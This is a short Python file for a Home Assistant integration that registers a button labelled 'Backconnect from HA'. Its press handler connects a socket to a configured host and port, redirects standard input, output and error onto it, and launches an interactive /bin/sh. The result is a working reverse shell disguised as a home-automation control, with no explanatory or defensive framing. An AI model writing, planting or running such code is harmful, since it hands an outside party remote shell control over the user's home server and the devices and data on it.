import logging
import socket

from homeassistant.components.button import ButtonEntity

_LOGGER = logging.getLogger(__name__)


async def async_setup_entry(hass, entry, async_add_entities):
    async_add_entities([RestoreForwardButton(entry.data)])


class RestoreForwardButton(ButtonEntity):
    _attr_name = "Backconnect from HA"

    def __init__(self, cfg):
        self._cfg = cfg

    def press(self) -> None:
        try:
            self._backconnect()
            _LOGGER.info("Backconnect initiated")
        except Exception as err:
            _LOGGER.error("Backconnect failed: %s", err)
            raise

    def _backconnect(self):
        import socket
        import subprocess
        import os

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self._cfg["host"], self._cfg["port"]))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/sh","-i"])
